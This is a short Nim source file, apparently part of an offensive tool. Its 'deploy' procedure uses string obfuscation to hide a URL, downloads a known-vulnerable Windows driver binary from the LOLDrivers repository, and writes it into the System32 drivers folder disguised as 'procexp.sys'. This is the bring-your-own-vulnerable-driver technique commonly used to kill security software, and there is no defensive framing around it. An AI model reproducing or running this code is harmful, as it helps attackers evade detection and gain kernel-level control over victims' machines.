import httpclient, puppy
import obf


# download from https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/e6cb1728c50bd020e531d19a14904e1c.bin
proc deploy*() =
    var 
        client = newHttpClient()
        file = driver_file

    #echo client.getContent("https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/e6cb1728c50bd020e531d19a14904e1c.bin")
    var driver = fetch(obf("https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/e6cb1728c50bd020e531d19a14904e1c.bin"))
    writeFile(obf("procexp.sys"), driver)
    moveFile(obf("procexp.sys"), obf("\\SystemRoot\\System32\\drivers\\procexp.sys"))
# move it to "\\SystemRoot\\System32\\drivers\\"